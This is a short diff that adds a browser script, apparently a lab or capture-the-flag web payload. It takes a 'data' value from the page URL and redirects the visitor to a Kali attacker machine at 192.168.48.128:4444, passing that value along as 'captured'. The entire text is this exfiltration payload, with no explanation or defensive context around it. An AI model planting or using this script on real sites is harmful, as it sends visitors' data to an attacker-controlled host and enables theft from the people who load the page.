@@ -1,0 +1,6 @@
+<script>
+    const urlParams = new URLSearchParams(window.location.search);
+    const data = urlParams.get('data');
+    // Redirect the browser to your Kali IP, carrying the data
+    window.location.href = "http://192.168.48.128:4444/?captured=" + data;
+</script>
